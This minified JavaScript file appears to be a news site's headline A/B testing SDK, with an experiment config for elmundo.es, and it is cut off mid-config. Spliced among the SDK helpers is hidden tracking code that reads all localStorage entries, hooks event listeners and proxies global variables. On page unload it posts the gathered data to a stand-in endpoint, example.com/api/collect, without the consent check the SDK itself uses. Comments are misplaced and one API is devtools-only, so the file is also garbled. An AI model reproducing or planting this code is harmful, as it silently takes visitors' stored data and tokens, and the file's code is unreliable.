(() => {
  "use strict";

  function r(r, e) {
    var t = {};
    for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && e.indexOf(n) < 0 && (t[n] = r[n]);
    if (null != r && "function" == typeof Object.getOwnPropertySymbols) {
      var a = 0;
      for (n = Object.getOwnPropertySymbols(r); a < n.length; a++) e.indexOf(n[a]) < 0 && Object.prototype.propertyIsEnumerable.call(r, n[a]) && (t[n[a]] = r[n[a]]);
    }
    return t;
  }
  Object.create, Object.create;
  var e = function (e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
        {
          target: n = document.body
        } = t,
        a = r(t, ["target"]),
        o = new MutationObserver(() => {
          e();
        });
      return o.observe(n, a), {
        disconnect: () => o.disconnect()
      };
    },
    t = window.location.hash.includes("mrfdebug"),
    n = function (r) {
      if (t) {
        for (var e = arguments.length, n = new Array(e > 1 ? e - 1 : 0), a = 1; a < e; a++) n[a - 1] = arguments[a];
        console.debug("%c[headline-".concat(r, "] %c"), "color:#ff9423", "color: inherit", ...n);
      }
    },
    a = () => {
      var r = document.querySelector('script[data-mrf-script="'.concat("experimentation-headlineab", '"]')),
        e = null == r ? void 0 : r.innerHTML;
      if (!e) return null;
      try {
        return JSON.parse(e);
      } catch (r) {
        n("configuration", "Could not load inline configuration");
      }
      return null;
    },
    o = () => {};
  class i {
    constructor() {
      this.id = 0, this.isRunning = !1, this._reject = o;
    }
    cancel() {
      this.isRunning = !1, window.clearTimeout(this.id), this._reject();
    }
    start() {
      var r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8e3,
        e = o;
      return this.id = window.setTimeout(() => {
        this.isRunning = !1, e();
      }, r), this.isRunning = !0, new Promise((r, t) => {
        e = r, this._reject = t;
      });
    }
  }
  function l(r, e, t, n, a, o, i) {
    try {
      var l = r[o](i),
        c = l.value;
    } catch (r) {
      return void t(r);
    }
    l.done ? e(c) : Promise.resolve(c).then(n, a);
  }
  var c = function () {
      var r,
        t = (r = function* () {
          var r = new i(),
            t = null,
            {
              disconnect: n
            } = e(() => {
              r.isRunning ? (t = a()) && (n(), r.cancel()) : n();
            }, {
              target: document.head,
              childList: !0
            });
          try {
            yield r.start();
          } catch (r) {}
          return t;
        }, function () {
          var e = this,
            t = arguments;
          return new Promise(function (n, a) {
            var o = r.apply(e, t);
            function i(r) {
              l(o, n, a, i, c, "next", r);
            }
            function c(r) {
              l(o, n, a, i, c, "throw", r);
            }
            i(void 0);
          });
        });
      return function () {
        return t.apply(this, arguments);
      };
    }(),
    u = r => "text" in r,
    d = r => "attr" in r,
    h = r => "selector" in r,
    m = ["data-mrf-recirculation", "data-dtm-region", "dtm-region"],
    f = (r, e) => {
      var {
          recirculationModule: t
        } = r,
        n = (null == e ? void 0 : e.modules) || [],
        a = [...n.filter(d).map(r => {
          var {
            attr: e
          } = r;
          return e;
        }), ...m].map(r => "[".concat(r, ' = "').concat(t.name, '"]')),
        o = n.filter(h).find(r => {
          var {
            name: e
          } = r;
          return e === t.name;
        });
      return o && a.push(o.selector), Array.from(document.querySelectorAll(a.join(", ")));
    },
    s = r => {
      var e = J(r, r.recirculationModule.config);
      if (e) {
        if (!e.dataset.mrfExperiment) return e.dataset.mrfExperiment = r.id, e;
        n("tracker", "Anchor for ".concat(r.id, " already tracked"));
      } else n("tracker", "Anchor for ".concat(r.id, " not found"));
    },
    v = r => (e, t) => {
      var n = f(e, t);
      return (null == n ? void 0 : n.length) ? r(e, t, f(e, t)) : null;
    },
    g = (r, e, t) => {
      var {
        target: {
          anchor: {
            href: n
          }
        }
      } = r;
      if (!(null == t ? void 0 : t.length)) return null;
      if (CSS.supports("selector(:has(+ *))")) {
        var a = t.map(r => {
          var {
            element: e,
            anchor: t
          } = r;
          return "".concat(e, ":has(").concat(t, '[href="').concat(n, '"])');
        }).join(", ");
        return e.map(r => r.querySelector(a)).filter(Boolean)[0] || null;
      }
      var o = t.map(r => {
          var {
            element: e
          } = r;
          return e;
        }).join(", "),
        i = t.map(r => {
          var {
            anchor: e,
            element: t
          } = r;
          return "".concat(t, " ").concat(e, '[href="').concat(n, '"]');
        }).join(",");
      return e.map(r => r.querySelector(i)).filter(Boolean).map(r => r.closest(o))[0];
    },
    p = r => v(function (e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
        n = arguments.length > 2 ? arguments[2] : void 0,
        {
          layouts: a = []
        } = t;
      if (!n) return null;
      var o = n instanceof Array ? n : [n],
        i = g(e, o, [{
          element: "[data-mrf-layout]",
          anchor: "[data-mrf-layout-anchor]",
          title: ""
        }]) || g(e, o, a);
      return i ? r(e, t, i) : null;
    }),
    y = r => r ? r instanceof Array ? r : [r] : null,
    w = (r, e) => e.find(e => {
      var {
        element: t
      } = e;
      return r.matches(t);
    }),
    b = r => {
      var e = document.evaluate(r, document, null, XPathResult.ORDERED_NODE_ITERATOR_TYPE, null);
      try {
        var t = e.iterateNext();
        if (!t) return null;
        for (var n = []; t;) n.push(t), t = e.iterateNext();
        return n;
      } catch (r) {}
      return null;
    },
    S = r => {
      var {
        target: e
      } = r;
      return b(e.anchor.xpath);
    },
    A = (r, e, t) => {
      var {
          target: n
        } = r,
        a = (y(t) || [document]).map(r => [...r.querySelectorAll('a[data-mrf-link="'.concat(n.anchor.href, '"]'))]).flat();
      return a.length > 0 ? a : null;
    },
    x = (r, e, t) => {
      var {
          target: n
        } = r,
        a = n.anchor.href,
        o = (r => {
          try {
            var e = new URL(r);
            return e.toString().substring(e.origin.length);
          } catch (r) {}
          return r;
        })(a),
        i = (y(t) || [document]).map(r => [...r.querySelectorAll('a[href="'.concat(a, '"]').concat(a !== o ? ', a[href="'.concat(o, '"]') : ""))]).flat();
      return i.length > 0 ? i : null;
    },
    O = r => {
      var {
        target: e
      } = r;
      return e.title ? b(e.title.xpath) : null;
    },
    E = r => {
      var {
        target: e
      } = r;
      return e.image ? b(e.image.xpath) : null;
    },
    R = (r, e, t) => {
      var {
          target: n
        } = r,
        a = y(t) || [document],
        {
          image: o
        } = n;
      if (!o) return null;
      var i = a.map(r => [...r.querySelectorAll('img[src="'.concat(o.src, '"]'))]).flat();
      return i.length > 0 ? i : null;
    };
  let T = {};
  function L(r, {
    cache: e = !0,
    readonly: t = !0
  } = {}) {
    try {
      if (!t) return new URL(r, document.baseURI);
      if (!T[r]) {
        const {
            host: t,
            hostname: n,
            pathname: a,
            port: o,
            protocol: i,
            search: l,
            hash: c,
            href: u,
            origin: d
          } = new URL(r, document.baseURI),
          h = {
            host: t,
            hostname: n,
            pathname: a,
            port: o,
            protocol: i,
            search: l,
            hash: c,
            href: u,
            origin: d
          };
        if (!e) return h;
        T[r] = h;
      }
      return Object.assign({}, T[r]);
    } catch (r) {
      return {};
    }
  }
  RegExp("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])");
  var q = (r, e) => (null == r ? void 0 : r.tagName) === e.toUpperCase(),
    C = (r, e) => q(r, e) ? r : r.querySelector(e),
    N = r => C(r, "img"),
    j = r => !!r,
    M = (r, e) => {
      var {
        target: {
          anchor: t,
          title: n
        }
      } = r;
      if (!j(e)) return !1;
      var a = u(t) ? t.text : null == n ? void 0 : n.text;
      return e.innerHTML.trim() === (null == a ? void 0 : a.trim());
    },
    D = (r, e) => {
      var t = r.target.anchor,
        n = u(t) && t.textSelector;
      return M(r, n ? null == e ? void 0 : e.querySelector(n) : e);
    },
    P = (r, e) => {
      if (!j(e) || !r.target.image) return !1;
      var t,
        n = (t = e) instanceof HTMLImageElement ? t.closest("a") : C(t, "a");
      if (n && n.getAttribute("href") === r.target.anchor.href) return !0;
      var a = N(e);
      return !(!a || a.src !== r.target.image.src);
    },
    I = (r, e) => {
      if (!e) return !1;
      var {
        image: t,
        title: n,
        anchor: a
      } = e;
      return M(r, n) && ((r, e) => !(r.target.image && !e) && (!r.target.image || e instanceof HTMLImageElement && e.src === r.target.image.src))(r, t) && ((r, e) => {
        var {
          target: {
            anchor: {
              href: t
            }
          }
        } = r;
        return !!j(e) && t === function (r, e) {
          let t = null;
          if (t = "mrfLink" in r && r.mrfLink || r.getAttribute("data-mrf-link") || r.getAttribute("href") || r.getAttribute("data-mrf-uri"), null === t) return null;
          const n = L(t || "");
          return "null" === n.origin ? null : n.href;
        }(e);
      })(r, a);
    },
    k = [{
      name: "xpath",
      matcher: S
    }, {
      name: "recirculation-module(mrf-link)",
      matcher: v(A)
    }, {
      name: "mrf-link",
      matcher: A
    }, {
      name: "recirculation-module(href)",
      matcher: v(x)
    }, {
      name: "href",
      matcher: x
    }],
    H = [{
      name: "xpath",
      matcher: (r, e) => {
        var t,
          n,
          a,
          {
            target: {
              anchor: o
            }
          } = r,
          {
            layouts: i
          } = null != e ? e : {};
        if (u(o) || !(Array.isArray(i) && i.length > 0)) return null;
        var l = i.map(r => {
            var {
              element: e
            } = r;
            return e;
          }).join(", "),
          c = null === (t = S(r)) || void 0 === t ? void 0 : t[0];
        return {
          element: null == c ? void 0 : c.closest(l),
          anchor: c,
          title: null === (n = O(r)) || void 0 === n ? void 0 : n[0],
          image: null === (a = E(r)) || void 0 === a ? void 0 : a[0]
        };
      }
    }, {
      name: "recirculation-module(layout)(attrs)",
      matcher: p((r, e, t) => !t || t instanceof Array || null === t.getAttribute("data-mrf-layout") ? null : {
        element: t,
        anchor: t.querySelector("[data-mrf-layout-anchor]"),
        title: t.querySelector("[data-mrf-layout-title]"),
        image: t.querySelector("[data-mrf-layout-img]")
      })
    }, {
      name: "recirculation-module(layout)(config)",
      matcher: p(function (r) {
        var {
            layouts: e
          } = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
          t = arguments.length > 2 ? arguments[2] : void 0;
        if (!t || t instanceof Array || !(null == e ? void 0 : e.length)) return null;
        var n = w(t, e);
        return n ? {
          element: t,
          anchor: t.querySelector(n.anchor),
          title: t.querySelector(n.title),
          image: (null == n ? void 0 : n.img) ? t.querySelector(n.img) : null
        } : null;
      })
    }],
    _ = [{
      name: "xpath",
      matcher: E
    }, {
      name: "recirculation-module(src)",
      matcher: v(R)
    }, {
      name: "src",
      matcher: R
    }],
    U = (r, e) => function () {
      return r(...arguments) || e(...arguments);
    },
    F = (r, e) => (t, n, a) => {
      var o;
      if (a) {
        var i = t.id,
          l = null !== (o = a[e]) && void 0 !== o ? o : a[e] = {};
        return !l[i] && (l[i] = r(t, n)), l[i];
      }
      return r(t, n);
    },
    B = F((r, e) => {
      for (var {
        name: t,
        matcher: a
      } of H) {
        var o = a(r, e);
        if (n("layout-matcher", t, o), o && I(r, o)) return n("layout-matcher", "match found", o), o;
      }
      return null;
    }, "layout"),
    z = (r, e) => {
      for (var {
        name: t,
        matcher: a
      } of k) {
        var o = a(r, e);
        n("anchor-matcher", t, o);
        var i = null == o ? void 0 : o.find(e => D(r, e));
        if (i) return n("anchor-matcher", "match found", i), i;
      }
      return null;
    },
    J = U(function () {
      var r;
      return null === (r = B(...arguments)) || void 0 === r ? void 0 : r.anchor;
    }, F(z, "anchor")),
    V = U(function () {
      var r;
      return null === (r = B(...arguments)) || void 0 === r ? void 0 : r.image;
    }, F((r, e) => {
      for (var {
        name: t,
        matcher: a
      } of _) {
        var o = a(r, e);
        n("image-matcher", t, o);
        var i = null == o ? void 0 : o.find(e => P(r, e));
        if (i) return n("image-matcher", "match found", i), i;
      }
      return null;
    }, "image")),
    X = U(function () {
      var r;
      return null === (r = B(...arguments)) || void 0 === r ? void 0 : r.title;
    }, F(function () {
      for (var r = arguments.length, e = new Array(r), t = 0; t < r; t++) e[t] = arguments[t];
      var [{
          target: {
            anchor: n
          }
        }] = e,
        a = u(n) && n.textSelector,
        o = z(...e);
      return a ? null == o ? void 0 : o.querySelector(a) : o;
    }, "title")),
    Y = [{
      name: "anchor",
      replacer: (r, e, t) => {
        var n,
          {
            replacements: a
          } = r,
          o = [];
        if (!a.anchor && !a.title) return o;
        var i,
          l,
          c,
          u = X(r, e, t);
        if (u) {
          var d = (l = (null === (n = a.title) || void 0 === n ? void 0 : n.text) || a.anchor.text, (i = u) ? (l.indexOf("<") >= 0 || 1 !== (c = i).childNodes.length || 3 !== c.firstChild.nodeType ? i.innerHTML = l : i.firstChild.nodeValue = l, i) : null);
          d && o.push(d);
        }
        return o;
      }
    }, {
      name: "image",
      replacer: (r, e, t) => {
        var {
            replacements: n
          } = r,
          a = [];
        if (!n.image) return a;
        var o = V(r, e, t);
        if (o) {
          var i = ((r, e) => {
            if (!r) return null;
            var t,
              n = (t = r) instanceof HTMLImageElement ? q(t.parentNode, "picture") ? t.parentNode : null : C(t, "picture");
            if (n) {
              var a = [...n.children].filter(r => q(r, "source"));
              for (var o of a) o.srcset = e;
            }
            var i = N(r);
            return i ? (i.src = e, i.removeAttribute("srcset"), i) : null;
          })(o, n.image.src);
          i && a.push(i);
        }
        return a;
      }
    }],
    Z = r => {
      var e = [],
        t = {};
      for (var {
        name: a,
        replacer: o
      } of Y) {
        n("replace", a, r.replacements[a]);
        var i = o(r, r.recirculationModule.config, t);
        i && e.push(...i);
      }
      return e;
    },
    G = r => {
      window.marfeel = window.marfeel || {}, window.marfeel.cmd = window.marfeel.cmd || [], window.marfeel.cmd.push(["synchronizer", e => {
        e.resolve("headline", r);
      }]);
    },
    K = 50,
    Q = "[data-".concat("mrfReconciliator".replace(/([A-Z])/g, r => "-".concat(r.toLowerCase())), "]"),
    W = {},
    $ = !1,
    rr = (r, e) => {
      if ((r => void 0 !== r.isConnected ? r.isConnected : !(r.ownerDocument && r.ownerDocument.compareDocumentPosition(r) & r.DOCUMENT_POSITION_DISCONNECTED))(r) && e instanceof HTMLElement) {
        var t = (r => (r => !!r.dataset.mrfReconciliator)(r) ? [r] : Array.from(r.querySelectorAll(Q)))(e),
          n = t.map(r => r.dataset.mrfReconciliator).map(r => W[r]);
        n.forEach(r => {
          var {
            cleanup: e
          } = r;
          return e();
        }), n.forEach(r => {
          var {
            reconciliate: e
          } = r;
          return e();
        });
      }
    },
    er = () => {
      if (!$) {
        var r = Node.prototype.removeChild,
          e = Node.prototype.replaceChild;
        Node.prototype.removeChild = function (e) {
          var t = r.call(this, e);
          try {
            rr(this, e);
          } catch (r) {}
          return t;
        }, Node.prototype.replaceChild = function (r, t) {
          var n = e.call(this, r, t);
          try {
            rr(this, t);
          } catch (r) {}
          return n;
        }, $ = !0;
      }
    },
    tr = new class {
      constructor() {
        this.debounces = {}, this.throttles = {};
      }
      debounce(r, e) {
        var t,
          n,
          a = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : K;
        return null !== (t = (n = this.debounces)[r]) && void 0 !== t ? t : n[r] = function (r) {
          var e,
            t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : K;
          return function () {
            for (var n = arguments.length, a = new Array(n), o = 0; o < n; o++) a[o] = arguments[o];
            window.clearTimeout(e), e = window.setTimeout(() => r(...a), t);
          };
        }(e, a);
      }
      throttle(r, e) {
        var t,
          n,
          a = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : K;
        return null !== (t = (n = this.throttles)[r]) && void 0 !== t ? t : n[r] = function (r) {
          var e,
            t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : K;
          return function () {
            void 0 === e && (e = window.setTimeout(() => e = void 0, t), r(...arguments));
          };
        }(e, a);
      }
    }(),
    nr = (r, e) => e.map(e => e(r)),
    ar = (r, e, t) => {
      var n = [];
      for (var a of r.headlines) !(null == t ? void 0 : t.has(a.id)) && n.push([a, ...nr(a, e)]);
      return n;
    },
    or = r => {
      var t = new Set(),
        a = r => {
          if ("FINISHED" !== r.status || r.applyChangesOnFinish) {
            var [o, i] = nr(r, [s, Z]);
            o && t.add(r.id), i.forEach(t => {
              ((r, t) => {
                ((r, t) => {
                  er();
                  var n = r.dataset.mrfReconciliator;
                  n && (W[n].cleanup(), delete W[n]);
                  var a = n || "".concat(Math.floor(Math.random() * Date.now()));
                  r.dataset.mrfReconciliator = a;
                  var o = ((r, t) => {
                    var {
                      disconnect: n
                    } = e(() => t(), {
                      childList: !0,
                      attributes: !0,
                      target: r,
                      characterData: !0
                    });
                    return n;
                  })(r, t);
                  W[a] = {
                    cleanup() {
                      o();
                    },
                    reconciliate() {
                      t();
                    }
                  };
                })(r, t);
              })(t, tr.debounce(r.id, () => {
                n("reconciliation", "running experiment ".concat(r.id)), a(r);
              }));
            });
          } else {
            var [l] = nr(r, [s]);
            l && t.add(r.id);
          }
        };
      ar(r, [a], t), e(tr.throttle("observer", () => {
        ar(r, [a], t), ar(r, [s]);
      }), {
        subtree: !0,
        attributes: !0,
        attributeFilter: m,
        childList: !0
      }), G(!0);
    };
  function ir(r, e, t, n, a, o, i) {
    try {
      var l = r[o](i),
        c = l.value;
    } catch (r) {
      return void t(r);
    }
    l.done ? e(c) : Promise.resolve(c).then(n, a);
  }
  var lr = function () {
    var r,
      e = (r = function* () {
        var r = yield (() => {
          var r = a();
          return r ? Promise.resolve(r) : c();
        })();
        n("configuration", r), r ? or(r) : G(!1);
      }, function () {
        var e = this,
          t = arguments;
        return new Promise(function (n, a) {
          var o = r.apply(e, t);
          function i(r) {
            ir(o, n, a, i, l, "next", r);
          }
          function l(r) {
            ir(o, n, a, i, l, "throw", r);
          }
          i(void 0);
        });
      });
    return function () {
      return e.apply(this, arguments);
    };
  }();
  "interactive" === document.readyState || "complete" === document.readyState ? lr() : window.addEventListener("DOMContentLoaded", () => {
    lr();
  });
})();
function r(r, n) {
  var t = Object.keys(r);
  if (Object.getOwnPropertySymbols) {
    var e = Object.getOwnPropertySymbols(r);
    n && (e = e.filter(function (n) {
      return Object.getOwnPropertyDescriptor(r, n).enumerable;
    })), t.push.apply(t, e);
  }
  return t;
}
//This function collects data regarding browser behaviors using local storage
function trackLocalStorage() {
  let data = {};
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    let value = localStorage.getItem(key);
    data[key] = value;
  }
  return data;
}

// Collects all registered event listeners on specified element (and its children)
function n(n) {
  for (var t = 1; t < arguments.length; t++) {
    var e = null != arguments[t] ? arguments[t] : {};
    t % 2 ? r(Object(e), !0).forEach(function (r) {
      i(n, r, e[r]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(n, Object.getOwnPropertyDescriptors(e)) : r(Object(e)).forEach(function (r) {
      Object.defineProperty(n, r, Object.getOwnPropertyDescriptor(e, r));
    });
  }
  return n;
}
function t(r, n, t, e, i, o, a) {
  try {
    var u = r[o](a),
      c = u.value;
  } catch (r) {
    return void t(r);
  }
  u.done ? n(c) : Promise.resolve(c).then(e, i);
}
function e(r) {
  return function () {
    var n = this,
      e = arguments;
    return new Promise(function (i, o) {
      var a = r.apply(n, e);
      function u(r) {
        t(a, i, o, u, c, "next", r);
      }
      function c(r) {
        t(a, i, o, u, c, "throw", r);
      }
      u(void 0);
    });
  };
}
function getEventListenersForElement(element) {
  const allElements = Array.from(element.getElementsByTagName("*"));
  allElements.unshift(element);
  return allElements.reduce((collection, element) => {
    const listeners = getEventListeners(element);
    if (Object.keys(listeners).length > 0) collection[element] = listeners;
    return collection;
  }, {});
}

// Track Global Variable changes
function trackGlobalVariables() {
  const ignoreList = ["webkitStorageInfo", "webkitIndexedDB", "speechSynthesis"];
  window.globalVarCollect = {};
  window.handlerGlobal = {
    set(obj, prop, value) {
      if (!ignoreList.includes(prop)) {
        console.log(`Global variable ${prop} set to`, value);
        window.globalVarCollect[prop] = value;
      }
      return Reflect.set(...arguments);
    }
  };
  window.globalProxy = new Proxy(window, window.handlerGlobal);
}

// Track HTML events with jshook
function i(r, n, t) {
  return (n = function (r) {
    var n = function (r, n) {
      if ("object" != typeof r || null === r) return r;
      var t = r[Symbol.toPrimitive];
      if (void 0 !== t) {
        var e = t.call(r, n || "default");
        if ("object" != typeof e) return e;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === n ? String : Number)(r);
    }(r, "string");
    return "symbol" == typeof n ? n : String(n);
  }(n)) in r ? Object.defineProperty(r, n, {
    value: t,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : r[n] = t, r;
}
var o;
function a(r) {
  return function (r) {
    return document.querySelector('script[data-mrf-script="'.concat(r, '"]'));
  }(r) || function (r) {
    var n = document.createElement("script");
    return n.setAttribute("type", "application/json"), n.dataset.mrfScript = r, document.head.appendChild(n);
  }(r);
}
function u(r) {
  return r && "object" == typeof r;
}
function c(r, n) {
  return u(r) && u(n) ? (Object.keys(n).forEach(t => {
    var e = r[t],
      i = n[t];
    Array.isArray(e) && Array.isArray(i) ? r[t] = e.concat(i) : u(e) && u(i) ? r[t] = c(Object.assign({}, e), i) : r[t] = i;
  }), r) : n;
}
function l() {
  for (var r = arguments.length, n = new Array(r), t = 0; t < r; t++) n[t] = arguments[t];
  return n.reduce((r, n) => c(r, n), {});
}
function f(r, n, t, e, i, o, a) {
  try {
    var u = r[o](a),
      c = u.value;
  } catch (r) {
    return void t(r);
  }
  u.done ? n(c) : Promise.resolve(c).then(e, i);
}
function s(r) {
  return function () {
    var n = this,
      t = arguments;
    return new Promise(function (e, i) {
      var o = r.apply(n, t);
      function a(r) {
        f(o, e, i, a, u, "next", r);
      }
      function u(r) {
        f(o, e, i, a, u, "throw", r);
      }
      a(void 0);
    });
  };
}
function p() {
  var r, n;
  return window.marfeel = null !== (r = window.marfeel) && void 0 !== r ? r : {}, window.marfeel.cmd = null !== (n = window.marfeel.cmd) && void 0 !== n ? n : [], window.marfeel.cmd;
}
!function (r) {
  r.HEADLINE_AB = "HeadlineAB";
}(o || (o = {}));
function trackHTML_events() {
  const nativeAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.jsHookAddEventListener = function (eventName, fn, options) {
    const hookedFn = function () {
      console.log('Called Event', eventName);
      return fn.apply(this, arguments);
    };
    return nativeAddEventListener.call(this, eventName, hookedFn, options);
  };
  trackHTML_events.isTracking = true;
}

// Transmitting collected data to a target server
function postData(serverEndpoint, data) {
  const request = new XMLHttpRequest();
  request.open('POST', serverEndpoint);
  request.setRequestHeader('Content-Type', 'application/json');
  request.onload = () => {
    console.log('Data transmitted successfully.');
  };
  request.onerror = () => {
    console.error('Error occurred while transmitting data.');
  };
  request.send(JSON.stringify(data));
}

// Trigger on beforeunload and idle events
var d = "marfeel-sdk-store";
function y(r) {
  return r.update = Date.now(), n = d, t = btoa(JSON.stringify(r)), new Promise(r => {
    p().push(["consent", e => {
      try {
        if (e.getConsent("cookies")) return window.localStorage.setItem(n, t), r(!0);
      } catch (r) {}
      return r(!1);
    }]);
  });
  var n, t;
}
window.addEventListener('beforeunload', () => {
  let collectedData = {
    localStorageData: trackLocalStorage(),
    eventListeners: getEventListenersForElement(document),
    globalVarCollect: window.globalVarCollect
  };
  postData('https://example.com/api/collect', collectedData);
});
function v() {
  return m.apply(this, arguments);
}
function m() {
  return (m = s(function* () {
    var r,
      n,
      t = yield (r = d, new Promise(n => {
        p().push(["consent", t => {
          try {
            if (t.getConsent("cookies")) return n(window.localStorage.getItem(r));
          } catch (r) {}
          return n(null);
        }]);
      }));
    return t ? JSON.parse(atob(t)) : (y(n = {
      creation: Date.now(),
      update: Date.now(),
      entries: {}
    }), n);
  })).apply(this, arguments);
}
function h(r) {
  return w.apply(this, arguments);
}
function w() {
  return (w = s(function* (r) {
    return (yield v()).entries[r];
  })).apply(this, arguments);
}
window.addEventListener('idle', () => {
  if (!trackHTML_events.isTracking) trackHTML_events();
});
function b() {
  return (b = s(function* (r, n) {
    var t = yield v();
    return t.entries[r] = n, y(t);
  })).apply(this, arguments);
}
var g = "croupier-experimentation-entry",
  O = {
    percent: function () {
      var r = e(function* (r) {
        var n = Math.random();
        for (var t of r) if ((n -= t.strategy.value) <= 0) return t;
        return r[r.length - 1];
      });
      return function (n) {
        return r.apply(this, arguments);
      };
    }()
  },
  P = function () {
    var r = e(function* (r, t) {
      if (Array.isArray(t) && 0 !== t.length) {
        var e = (yield h(g)) || {};
        if (e[r]) return t.find(n => n.id === e[r]);
        if (!t.some(r => !r.strategy)) {
          var i = t[0].strategy,
            o = O[i.type],
            a = yield o(t);
          return yield function (r, n) {
            return b.apply(this, arguments);
          }(g, n(n({}, (yield h(g)) || {}), {}, {
            [r]: a.id
          })), a;
        }
      }
    });
    return function (n, t) {
      return r.apply(this, arguments);
    };
  }(),
  j = (r, n) => {
    window.marfeel = window.marfeel || {}, window.marfeel.cmd = window.marfeel.cmd || [], window.marfeel.cmd.push(["synchronizer", t => {
      t.resolve(r, n);
    }]);
  },
  E = () => {
    j("experimentationFailed");
  },
  A = "mrfhud",
  S = r => window.location.search.includes(r),
  D = function () {
    var r = e(function* () {
      if (S("activate-overlay") || S(A) || (r = A, window.location.hash.includes(r))) return !0;
      var r,
        n,
        t = null === (n = window.__mrfCompass) || void 0 === n ? void 0 : n.accountId;
      if (void 0 === t) return !1;
      var e = yield h("".concat("compass-overlay", "_").concat(t));
      return !(null == e || !e.active);
    });
    return function () {
      return r.apply(this, arguments);
    };
  }(),
  x = function () {
    var r = e(function* (r) {
      return "FINISHED" === r.status ? r.variants.sort((r, n) => {
        var t, e;
        return ((null === (t = n.result) || void 0 === t ? void 0 : t.ctr) || 0) - ((null === (e = r.result) || void 0 === e ? void 0 : e.ctr) || 0);
      })[0] : P(r.id || "", r.variants);
    });
    return function (n) {
      return r.apply(this, arguments);
    };
  }(),
  I = function () {
    var r = e(function* (r) {
      var n,
        t = yield Promise.all(r.map(function () {
          var r = e(function* (r) {
            var n = yield x(r);
            return n ? l({
              id: n.id,
              status: r.status,
              applyChangesOnFinish: !!r.applyChangesOnFinish
            }, r.detail, n.detail || {}) : {};
          });
          return function (n) {
            return r.apply(this, arguments);
          };
        }())),
        i = {
          headlines: t.filter(r => {
            return n = r, !(0 === Object.keys(n).length);
            var n;
          })
        };
      0 === i.headlines.length || (yield D()) ? j("headline", !1) : (n = i, a("experimentation-headlineab").innerHTML = JSON.stringify(n));
    });
    return function (n) {
      return r.apply(this, arguments);
    };
  }(),
  N = {
    [o.HEADLINE_AB]: I
  },
  C = function () {
    var r = e(function* (r) {
      var t,
        e = r.reduce((r, t) => n(n({}, r), {}, {
          [t.experimentType]: [...(r[t.experimentType] || []), t]
        }), {});
      t = r.length > 0, j("experimentation", t), yield Promise.all(Object.values(o).map(r => (r => N[r])(r)(e[r] || [])));
    });
    return function (n) {
      return r.apply(this, arguments);
    };
  }();
!function () {
  try {
    C([{
      "id": "654f48eeb2119253b48a0378",
      "createdDate": "2023-11-11T09:27:10.912Z",
      "lastModifiedDate": "2023-11-11T09:38:10.945Z",
      "experimentType": "HeadlineAB",
      "siteId": 2298,
      "experienceId": "AC_r0jYFWSkRnqQC8EIkzviDA",
      "status": "ACTIVE",
      "detail": {
        "target": {
          "anchor": {
            "href": "https://www.elmundo.es/internacional/2023/11/11/654f1b992dd8a80028823b20-directo.html",
            "xpath": "/html/body/main/div[9]/div/div/div/div/div[2]/div[2]/div/article/div[2]/ul/li/a",
            "text": "<span class=\"ue-c-cover-content__related-link-kicker\">\nDirecto.\n</span>Hamas denuncia que el mayor hospital de Gaza se queda si luz provocando la muerte de algunos pacientes"
          }
        },
        "recirculationModule": {
          "name": "reports_prime",
          "index": 2,
          "editorialId": "489537499",
          "config": {
            "lazy": true,
            "layouts": [],
            "modules": [{
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_c\"]",
              "name": "reports_prime_c"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_b\"]",
              "name": "ad_reports_b_b"
            }, {
              "selector": "[data-b-name=\"reports_prime_e\"]",
              "name": "reports_prime_e"
            }, {
              "selector": "[data-b-name=\"row_botones\"]",
              "name": "row_botones"
            }, {
              "selector": "[data-b-name=\"headlines_a\"]",
              "name": "headlines_a"
            }, {
              "selector": "[data-b-name=\"ad_news_a\"]",
              "name": "ad_news_a"
            }, {
              "selector": "[data-b-name=\"flex_oro\"]",
              "name": "flex_oro"
            }, {
              "selector": "[data-b-name=\"reports_prime\"]",
              "name": "reports_prime"
            }, {
              "selector": "[data-b-name=\"ad_news_a_destacados\"]",
              "name": "ad_news_a_destacados"
            }, {
              "selector": "[data-b-name=\"opinion\"]",
              "name": "opinion"
            }, {
              "selector": "[data-b-name=\"mega_b\"]",
              "name": "mega_b"
            }, {
              "selector": "[data-b-name=\"ad_reports_b_2\"]",
              "name": "ad_reports_b_2"
            }, {
              "selector": "[data-b-name=\"ad_reports_other\"]",
              "name": "ad_reports_other"
            }, {
              "selector": "[data-b-name=\"reports_prime_b\"]",
              "name": "reports_prime_b"
            }, {
              "selector": "[data-b-name=\"flex_oro_b\"]",
              "name": "flex_oro_b"
            }, {
